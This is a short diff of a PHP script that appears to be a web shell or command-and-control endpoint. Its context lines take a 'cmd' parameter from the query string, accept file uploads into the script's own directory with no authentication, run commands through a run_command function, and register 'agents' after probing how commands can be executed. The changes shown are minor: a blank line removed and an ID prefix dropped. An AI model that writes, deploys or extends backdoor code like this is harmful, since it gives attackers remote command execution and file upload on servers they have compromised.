@@ -17,7 +17,6 @@ $cmd    = isset($_GET['cmd']) ? $_GET['cmd'] : "";
 if ($action === "upload" && isset($_FILES['file'])) {
     $target_dir = __DIR__ . "/";
     $target_file = $target_dir . basename($_FILES['file']['name']);
-
     if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
         echo json_encode(array("status" => "uploaded", "file" => basename($_FILES['file']['name'])));
     } else {
@@ -83,7 +82,7 @@ function run_command($cmd, $method, $cwd) {
 
 // ---------- REGISTER ----------
 if ($action === "register") {
-    if (!$id) $id = uniqid("agent_");
+    if (!$id) $id = uniqid();
     if (!isset($data[$id])) {
         $method = detect_exec_method();
         $cwd = getcwd();
